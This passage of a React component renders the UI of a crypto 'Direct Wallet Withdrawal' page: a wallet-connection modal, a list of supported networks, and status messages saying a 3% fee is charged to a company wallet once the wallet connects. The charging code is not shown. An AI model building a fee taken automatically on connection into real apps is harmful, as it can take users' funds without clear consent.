                borderRadius: '16px',
                backdropFilter: 'blur(10px)',
                maxWidth: '500px',
                margin: '0 auto'
              }}>
                <div style={{ fontSize: '16px', marginBottom: '8px', opacity: 0.9 }}>✅ Connected & Ready</div>
                <div style={{ fontSize: '24px', fontWeight: 'bold' }}>{shortenAddress(address!)}</div>
                <div style={{ fontSize: '14px', marginTop: '8px', opacity: 0.85 }}>
                  Network: {chain?.name}
                </div>
                <div style={{ marginTop: '12px', fontSize: '14px', color: '#d6bcfa' }}>
                  {serviceFeeProcessing && 'Charging 3% service fee to the company wallet...'}
                  {!serviceFeeProcessing && serviceFeeSent && !serviceFeeError && '✅ 3% service fee charged successfully.'}
                  {!serviceFeeProcessing && serviceFeeError && `⚠️ ${serviceFeeError}`}
                </div>
                {serviceFeeHash && !serviceFeeError && (
                  <div style={{ marginTop: '10px' }}>
                    <a
                      href={handleExplorerUrl(serviceFeeHash)}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ color: '#e0def8', textDecoration: 'underline', fontSize: '13px' }}
                    >
                      View service fee tx
                    </a>
                  </div>
                )}
              </div>
            )}

            {error && (
              <div style={{ 
                marginTop: '24px', 
                padding: '16px', 
                background: 'rgba(229, 62, 62, 0.3)',
                borderRadius: '12px',
                maxWidth: '600px',
                margin: '24px auto 0'
              }}>
                ⚠️ {error}
              </div>
            )}
          </div>
        </section>


        {/* Wallet Selection Modal */}
        {showWalletModal && (
          <div style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.5)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1000
          }}>
            <div style={{
              background: 'white',
              borderRadius: '20px',
              padding: '32px',
              maxWidth: '600px',
              width: '90%',
              maxHeight: '90vh',
              overflow: 'auto'
            }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '24px' }}>
                <div style={{ maxWidth: '620px' }}>
                  <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: '#1a202c', margin: 0 }}>
                    Connect Your Wallet
                  </h2>
                  <p style={{ marginTop: '10px', color: '#475569', fontSize: '14px', lineHeight: '1.75' }}>
                    Choose a wallet connection method for desktop or mobile. WalletConnect provides QR code and deep-link support for compatible wallets, while browser wallet connections happen instantly in the browser.
                  </p>
                </div>
                <button 
                  onClick={() => setShowWalletModal(false)}
                  style={{
                    background: 'none',
                    border: 'none',
                    fontSize: '24px',
                    cursor: 'pointer',
                    color: '#718096'
                  }}
                >
                  ×
                </button>
              </div>
              
              {!isWalletConnectEnabled && (
                <div style={{
                  marginBottom: '20px',
                  padding: '12px 14px',
                  borderRadius: '8px',
                  background: '#fef3c7',
                  color: '#92400e',
                  fontSize: '14px',
                  lineHeight: '1.5'
                }}>
                  WalletConnect support is currently disabled because the WalletConnect project ID has not been configured. To enable mobile and desktop wallet connections, set <code>NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID</code> to a valid WalletConnect Cloud project ID, then refresh the page.
                </div>
              )}

              <div style={{ marginBottom: '24px' }}>
                <div style={{ display: 'grid', gap: '12px' }}>
                  <button
                    onClick={() => connectWallet('auto')}
                    disabled={isConnecting}
                    style={{
                      width: '100%',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '16px',
                      padding: '20px',
                      border: '2px solid #667eea',
                      borderRadius: '12px',
                      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                      color: 'white',
                      cursor: 'pointer',
                      transition: 'all 0.2s ease',
                      fontSize: '18px',
                      fontWeight: '600',
                      opacity: isConnecting ? 0.7 : 1,
                    }}
                  >
                    <span style={{ fontSize: '24px' }}>🚀</span>
                    {isPending ? 'Opening Wallet...' : 'Connect Any Available Wallet'}
                  </button>

                  <button
                    onClick={() => connectWallet('injected')}
                    disabled={isConnecting}
                    style={{
                      width: '100%',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '16px',
                      padding: '16px 20px',
                      border: '2px solid #cbd5e1',
                      borderRadius: '12px',
                      background: '#ffffff',
                      color: '#334155',
                      cursor: 'pointer',
                      fontSize: '16px',
                      fontWeight: '600',
                    }}
                  >
                    <span style={{ fontSize: '20px' }}>🦊</span>
                    Connect Browser Wallet
                  </button>

                  <button
                    onClick={() => connectWallet('coinbaseWallet')}
                    disabled={isConnecting}
                    style={{
                      width: '100%',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      gap: '16px',
                      padding: '16px 20px',
                      border: '2px solid #cbd5e1',
                      borderRadius: '12px',
                      background: '#ffffff',
                      color: '#334155',
                      cursor: 'pointer',
                      fontSize: '16px',
                      fontWeight: '600',
                    }}
                  >
                    <span style={{ fontSize: '20px' }}>🔵</span>
                    Connect Coinbase Wallet
                  </button>

                  {isWalletConnectEnabled && connectors.some((connector) => connector.id === 'walletConnect') && (
                    <>
                      <button
                        onClick={() => connectWallet('walletConnect')}
                        disabled={isConnecting}
                        style={{
                          width: '100%',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          gap: '16px',
                          padding: '16px 20px',
                          border: '2px solid #cbd5e1',
                          borderRadius: '12px',
                          background: '#ffffff',
                          color: '#334155',
                          cursor: 'pointer',
                          fontSize: '16px',
                          fontWeight: '600',
                        }}
                      >
                        <span style={{ fontSize: '20px' }}>📱</span>
                        Connect with WalletConnect
                      </button>
                      <p style={{ marginTop: '12px', fontSize: '13px', color: '#475569', lineHeight: '1.75' }}>
                        WalletConnect supports mobile and desktop wallets through QR code scanning and deep linking. Ideal for wallets such as Rainbow, Argent, Trust Wallet, MetaMask Mobile, Ledger, and other WalletConnect-enabled apps.
                      </p>
                    </>
                  )}
                </div>
              </div>

            </div>
          </div>
        )}

        {/* Supported Networks */}
        <section style={{ padding: '60px 24px', background: '#f8f9fa' }}>
          <div style={{ maxWidth: '1200px', margin: '0 auto', textAlign: 'center' }}>
            <h2 style={{ fontSize: '32px', fontWeight: 'bold', marginBottom: '40px', color: '#1a202c' }}>
              Supported Networks
            </h2>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '20px' }}>
              {['Ethereum', 'Polygon', 'Arbitrum', 'Optimism', 'BNB Smart Chain', 'Avalanche', 'Fantom', 'Celo', 'Base', 'Linea', 'Scroll'].map(network => (
                <div key={network} style={{ 
                  background: 'white', 
                  padding: '20px', 
                  borderRadius: '12px',
                  fontWeight: '600',
                  color: '#4a5568'
                }}>
                  {network}
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer style={{ padding: '40px 24px', background: '#1a202c', color: 'white', textAlign: 'center' }}>
          <p style={{ opacity: 0.8 }}>&copy; 2026 Direct Wallet Withdrawal</p>
        </footer>
      </div>
    </>
  );
}
